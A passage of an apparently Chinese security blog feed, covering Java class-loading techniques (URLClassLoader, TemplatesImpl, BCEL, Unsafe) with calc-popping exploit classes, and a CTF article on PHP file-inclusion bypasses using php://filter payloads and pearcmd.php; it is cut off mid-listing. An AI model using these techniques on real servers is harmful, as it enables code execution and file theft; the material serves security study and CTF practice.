来寻找类</p></li></ol><p>注意第三种情况，<strong>如果我们使用的是http协议，那么就会使用到Loader来寻找类，也就是说URLClassLoader允许远程加载类</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.URL; <br><span class="hljs-keyword">import</span> java.net.URLClassLoader; <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClassLoader</span> <br>&#123; <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">( String[] args )</span> <span class="hljs-keyword">throws</span> Exception <br>&#123; <br>URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8000/&quot;</span>)&#125;; <br><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(urls); <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> loader.loadClass(<span class="hljs-string">&quot;Hello&quot;</span>); <br>c.newInstance(); <br>&#125; <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-利用xlan"><a href="#3-利用xlan" class="headerlink" title="3.利用xlan"></a>3.利用xlan</h3><p><strong>TemplatesImpl</strong>是<code>com.sun.org.apache.xalan</code>包中一个非常有利用价值的类，它是默认包含在JDK中的。</p><p>通过调用其<code>newTransformer()</code>方法我们最终可以调用<code>defineClass()</code>，具体的细节并不复杂不再赘述，大致过程是</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">newTransformer<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> getTransletInstance<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> defineTransletClasses<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> defineClass()<br></code></pre></td></tr></table></figure><p>当然有几个属性要满足条件才能打通利用链:</p><ul><li><code>_name</code>不为空</li><li><code>_bytecodes</code>存放字节码</li><li><code>_tfactory</code>必须是TransformerFactoryImpl类</li><li>加载的类必须是AbstractTranslet的子类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Test.java</span><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">namefield</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        namefield.setAccessible(<span class="hljs-literal">true</span>);<br>        namefield.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">//_class属性为null不赋值</span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;c:\\tmp\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span> [][] codes = &#123;code&#125;;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesfield</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesfield.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodesfield.set(templates,codes); <span class="hljs-comment">//载入字节码</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryfield</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryfield.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>        <span class="hljs-comment">//运行弹出计算器</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-利用BCELClassLoader"><a href="#4-利用BCELClassLoader" class="headerlink" title="4.利用BCELClassLoader"></a>4.利用BCELClassLoader</h3><p>注意: <strong>BCELclassloader在jdk8u251之后的版本就无法使用</strong></p><p>BCEL字节码是字节码的一种，与上文中提到的字节码在本质上并无不同，仅仅是形式上的变化。</p><ul><li>BCEL类存储在com.sun.org.apache.bcel.internal.util包中。</li><li>BECL ClassLoader也是一种恢复成一个类并在JVM虚拟机中进行加载的字节序列。</li><li>BCEL也是在JDK库中，在com.sun.org.apache.bcel.internal.util的包中有一个ClassLoader类，它是一个ClassLoader类，和默认的java.lang包下的ClassLoader类不同，loadClass实现不同而已。</li><li>欲让BCELclassloader识别加载BCEL字节码，<strong>需要在开头添加</strong><code>$$BCEL$$</code>。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;<br><span class="hljs-keyword">import</span> evil.Exploit;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELClassLoaderDemo</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生成BCEL格式的字节码，方法一：</span><br><span class="hljs-comment">     *   通过 Repository.lookupClass()将Class对象转化为表示Java字节码的对象JavaClass</span><br><span class="hljs-comment">     *   然后通过Utility.encode() 将Java字节码对象JavaClass转化为BCEL格式的字节码</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateBcelCode1</span><span class="hljs-params">(Class clazz)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">evilJavaClazz</span> <span class="hljs-operator">=</span> Repository.lookupClass(clazz);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(evilJavaClazz.getBytes(), <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">bcelCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + code;<br>        System.out.println(<span class="hljs-string">&quot;bcelcode=&quot;</span> + bcelCode);<br>        <span class="hljs-keyword">return</span> bcelCode;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 生成BCEL格式的字节码，方法二：</span><br><span class="hljs-comment">     *   将Java字节码直接传入Utility.encode() ，从而得到BCEL格式的字节码</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateBcelCode2</span><span class="hljs-params">(String classBase64)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] codes = Base64.getDecoder().decode(classBase64);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(codes, <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">bcelCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + code;<br>        System.out.println(<span class="hljs-string">&quot;bcelcode=&quot;</span> + bcelCode);<br>        <span class="hljs-keyword">return</span> bcelCode;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">bcelClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>();<br><span class="hljs-comment">//            String bcelCode = generateBcelCode1(Exploit.class);</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">bcelCode</span> <span class="hljs-operator">=</span> generateBcelCode2(<span class="hljs-string">&quot;yv66v...(class字节码的base64编码)...&quot;</span>);<br>            bcelClassLoader.loadClass(bcelCode).newInstance();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Exploit.java</span><br><span class="hljs-keyword">package</span> evil;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="5-利用unsafe"><a href="#5-利用unsafe" class="headerlink" title="5.利用unsafe"></a>5.利用unsafe</h3><p><code>sun.misc.Unsafe</code>类中有<code>defineClass()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">sun.misc.Unsafe <span class="hljs-keyword">public</span> Class&lt;?&gt; defineClass(String s,<br>                            <span class="hljs-type">byte</span>[] bytes,<br>                            <span class="hljs-type">int</span> i,<br>                            <span class="hljs-type">int</span> i1,<br>                            ClassLoader classLoader,<br>                            java.security.ProtectionDomain protectionDomain)<br></code></pre></td></tr></table></figure><p>我们可以直接调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">// 获取Unsafe无参构造方法</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredConstructor();<br><br><span class="hljs-comment">// 修改构造方法访问权限</span><br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// 反射创建Unsafe类实例，等价于 Unsafe unsafe = new Unsafe();</span><br><span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) constructor.newInstance();<br>unsafe.defineClass(&lt;className&gt;,&lt;classBytes&gt;,&lt;offset=<span class="hljs-number">0</span>&gt;,&lt;length&gt;);<br></code></pre></td></tr></table></figure><p>测试用class自行编写。</p><p>unsafe的补充: <a href="https://javasec.org/javase/Unsafe">https://javasec.org/javase/Unsafe</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>类加载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-文件包含的特殊姿势</title>
    <link href="/2022/11/18/ctf-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E7%89%B9%E6%AE%8A%E5%A7%BF%E5%8A%BF/"/>
    <url>/2022/11/18/ctf-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E7%89%B9%E6%AE%8A%E5%A7%BF%E5%8A%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含的特殊姿势"><a href="#文件包含的特殊姿势" class="headerlink" title="文件包含的特殊姿势"></a>文件包含的特殊姿势</h1><h2 id="filter读文件绕过"><a href="#filter读文件绕过" class="headerlink" title="filter读文件绕过"></a>filter读文件绕过</h2><p>最常用的payload莫过于</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=&lt;filename&gt;<br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.string.rot13/</span>resource=&lt;filename&gt;<br></code></pre></td></tr></table></figure><p>如果base、string等关键词被禁，也可以使用iconv来转换编码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.ASCII.UCS-2BE/</span>resource=&lt;filename&gt;<br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.utf-8.utf-7/</span>resource=&lt;filename&gt;<br></code></pre></td></tr></table></figure><p>php支持很多编码，具体见<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">链接</a>。此外利用iconv进行多层编码转换可以实现include2shell，后面会讲到。</p><p>绕过关键词还可以使用多重url编码来绕过，因为include自带url解码。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 对base64-encode编码两次</span><br>php:<span class="hljs-regexp">//</span>filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=&lt;filename&gt;<br></code></pre></td></tr></table></figure><h2 id="pearcmd"><a href="#pearcmd" class="headerlink" title="pearcmd"></a>pearcmd</h2><p>参考<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">P牛blog</a>，pecl是管理php拓展使用的命令行工具，pear是pecl依赖的类库，我们所利用的就是pearcmd.php这个位于pecl&#x2F;pear中的文件。</p><p>首先是pecl&#x2F;pear的安装范围，即trick的使用场景：</p><ul><li>php &lt;&#x3D; 7.3 默认安装。</li><li>php &gt;&#x3D; 7.4 在编译PHP的时候指定<code>--with-pear</code>才会安装。</li><li>Docker的任意版本镜像中都被默认安装，路径在<code>/usr/local/lib/php</code>。</li></ul><h3 id="register-argc-argv"><a href="#register-argc-argv" class="headerlink" title="register_argc_argv"></a>register_argc_argv</h3><p>此参数开启的情况下，会将$_SERVER[‘argv’]当作参数执行，即我们传入的query_string可以被识别为参数选项。</p><p>我们查看pearcmd.php的参数选项</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Commands</span><span class="hljs-operator">:</span><br><span class="hljs-variable">build</span>                  <span class="hljs-variable">Build</span> <span class="hljs-variable">an</span> <span class="hljs-built_in">Extension</span> <span class="hljs-variable">From</span> <span class="hljs-built_in">C</span> <span class="hljs-variable">Source</span><br><span class="hljs-variable">bundle</span>                 <span class="hljs-variable">Unpacks</span> <span class="hljs-variable">a</span> <span class="hljs-variable">Pecl</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">add</span>            <span class="hljs-variable">Add</span> <span class="hljs-variable">a</span> <span class="hljs-variable">Channel</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">alias</span>          <span class="hljs-variable">Specify</span> <span class="hljs-variable">an</span> <span class="hljs-variable">alias</span> <span class="hljs-variable">to</span> <span class="hljs-variable">a</span> <span class="hljs-variable">channel</span> <span class="hljs-variable">name</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">delete</span>         <span class="hljs-built_in">Remove</span> <span class="hljs-variable">a</span> <span class="hljs-variable">Channel</span> <span class="hljs-variable">From</span> <span class="hljs-variable">the</span> <span class="hljs-built_in">List</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">discover</span>       <span class="hljs-built_in">Initialize</span> <span class="hljs-variable">a</span> <span class="hljs-variable">Channel</span> <span class="hljs-variable">from</span> <span class="hljs-variable">its</span> <span class="hljs-variable">server</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">info</span>           <span class="hljs-variable">Retrieve</span> <span class="hljs-built_in">Information</span> <span class="hljs-variable">on</span> <span class="hljs-variable">a</span> <span class="hljs-variable">Channel</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">login</span>          <span class="hljs-variable">Connects</span> <span class="hljs-variable">and</span> <span class="hljs-variable">authenticates</span> <span class="hljs-variable">to</span> <span class="hljs-variable">remote</span> <span class="hljs-variable">channel</span> <span class="hljs-variable">server</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">logout</span>         <span class="hljs-variable">Logs</span> <span class="hljs-variable">out</span> <span class="hljs-variable">from</span> <span class="hljs-variable">the</span> <span class="hljs-variable">remote</span> <span class="hljs-variable">channel</span> <span class="hljs-variable">server</span><br><span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">update</span>         <span class="hljs-built_in">Update</span> <span class="hljs-variable">an</span> <span class="hljs-variable">Existing</span> <span class="hljs-variable">Channel</span><br><span class="hljs-variable">clear</span><span class="hljs-operator">-</span><span class="hljs-variable">cache</span>            <span class="hljs-built_in">Clear</span> <span class="hljs-variable">Web</span> <span class="hljs-variable">Services</span> <span class="hljs-variable">Cache</span><br><span class="hljs-variable">config</span><span class="hljs-operator">-</span><span class="hljs-variable">create</span>          <span class="hljs-variable">Create</span> <span class="hljs-variable">a</span> <span class="hljs-built_in">Default</span> <span class="hljs-variable">configuration</span> <span class="hljs-variable">file</span><br><span class="hljs-variable">config</span><span class="hljs-operator">-</span><span class="hljs-variable">get</span>             <span class="hljs-built_in">Show</span> <span class="hljs-variable">One</span> <span class="hljs-built_in">Setting</span><br><span class="hljs-variable">config</span><span class="hljs-operator">-</span><span class="hljs-variable">help</span>            <span class="hljs-built_in">Show</span> <span class="hljs-built_in">Information</span> <span class="hljs-variable">About</span> <span class="hljs-built_in">Setting</span><br><span class="hljs-variable">config</span><span class="hljs-operator">-</span><span class="hljs-variable">set</span>             <span class="hljs-variable">Change</span> <span class="hljs-built_in">Setting</span><br><span class="hljs-variable">config</span><span class="hljs-operator">-</span><span class="hljs-variable">show</span>            <span class="hljs-built_in">Show</span> <span class="hljs-built_in">All</span> <span class="hljs-variable">Settings</span><br><span class="hljs-variable">convert</span>                <span class="hljs-variable">Convert</span> <span class="hljs-variable">a</span> <span class="hljs-variable">package</span><span class="hljs-operator">.</span><span class="hljs-variable">xml</span> <span class="hljs-number">1.0</span> <span class="hljs-variable">to</span> <span class="hljs-variable">package</span><span class="hljs-operator">.</span><span class="hljs-variable">xml</span> <span class="hljs-number">2.0</span> <span class="hljs-variable">format</span><br><span class="hljs-variable">cvsdiff</span>                <span class="hljs-built_in">Run</span> <span class="hljs-variable">a</span> <span class="hljs-string">&quot;cvs diff&quot;</span> <span class="hljs-variable">for</span> <span class="hljs-variable">all</span> <span class="hljs-variable">files</span> <span class="hljs-variable">in</span> <span class="hljs-variable">a</span> <span class="hljs-variable">package</span><br><span class="hljs-variable">cvstag</span>                 <span class="hljs-built_in">Set</span> <span class="hljs-variable">CVS</span> <span class="hljs-built_in">Release</span> <span class="hljs-variable">Tag</span><br><span class="hljs-variable">download</span>               <span class="hljs-variable">Download</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">download</span><span class="hljs-operator">-</span><span class="hljs-variable">all</span>           <span class="hljs-variable">Downloads</span> <span class="hljs-variable">each</span> <span class="hljs-variable">available</span> <span class="hljs-variable">package</span> <span class="hljs-variable">from</span> <span class="hljs-variable">the</span> <span class="hljs-variable">default</span> <span class="hljs-variable">channel</span><br><span class="hljs-variable">info</span>                   <span class="hljs-built_in">Display</span> <span class="hljs-variable">information</span> <span class="hljs-variable">about</span> <span class="hljs-variable">a</span> <span class="hljs-variable">package</span><br><span class="hljs-variable">install</span>                <span class="hljs-built_in">Install</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">list</span>                   <span class="hljs-built_in">List</span> <span class="hljs-variable">Installed</span> <span class="hljs-variable">Packages</span> <span class="hljs-built_in">In</span> <span class="hljs-variable">The</span> <span class="hljs-built_in">Default</span> <span class="hljs-variable">Channel</span><br><span class="hljs-variable">list</span><span class="hljs-operator">-</span><span class="hljs-variable">all</span>               <span class="hljs-built_in">List</span> <span class="hljs-built_in">All</span> <span class="hljs-variable">Packages</span><br><span class="hljs-variable">list</span><span class="hljs-operator">-</span><span class="hljs-variable">channels</span>          <span class="hljs-built_in">List</span> <span class="hljs-variable">Available</span> <span class="hljs-variable">Channels</span><br><span class="hljs-variable">list</span><span class="hljs-operator">-</span><span class="hljs-variable">files</span>             <span class="hljs-built_in">List</span> <span class="hljs-variable">Files</span> <span class="hljs-built_in">In</span> <span class="hljs-variable">Installed</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">list</span><span class="hljs-operator">-</span><span class="hljs-variable">upgrades</span>          <span class="hljs-built_in">List</span> <span class="hljs-variable">Available</span> <span class="hljs-variable">Upgrades</span><br><span class="hljs-variable">login</span>                  <span class="hljs-variable">Connects</span> <span class="hljs-variable">and</span> <span class="hljs-variable">authenticates</span> <span class="hljs-variable">to</span> <span class="hljs-variable">remote</span> <span class="hljs-variable">server</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">Deprecated</span> <span class="hljs-variable">in</span> <span class="hljs-variable">favor</span> <span class="hljs-variable">of</span> <span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">login</span><span class="hljs-punctuation">]</span><br><span class="hljs-variable">logout</span>                 <span class="hljs-variable">Logs</span> <span class="hljs-variable">out</span> <span class="hljs-variable">from</span> <span class="hljs-variable">the</span> <span class="hljs-variable">remote</span> <span class="hljs-variable">server</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">Deprecated</span> <span class="hljs-variable">in</span> <span class="hljs-variable">favor</span> <span class="hljs-variable">of</span> <span class="hljs-variable">channel</span><span class="hljs-operator">-</span><span class="hljs-variable">logout</span><span class="hljs-punctuation">]</span><br><span class="hljs-variable">makerpm</span>                <span class="hljs-variable">Builds</span> <span class="hljs-variable">an</span> <span class="hljs-variable">RPM</span> <span class="hljs-variable">spec</span> <span class="hljs-variable">file</span> <span class="hljs-variable">from</span> <span class="hljs-variable">a</span> <span class="hljs-variable">PEAR</span> <span class="hljs-variable">package</span><br><span class="hljs-variable">package</span>                <span class="hljs-variable">Build</span> <span class="hljs-built_in">Package</span><br><span class="hljs-variable">package</span><span 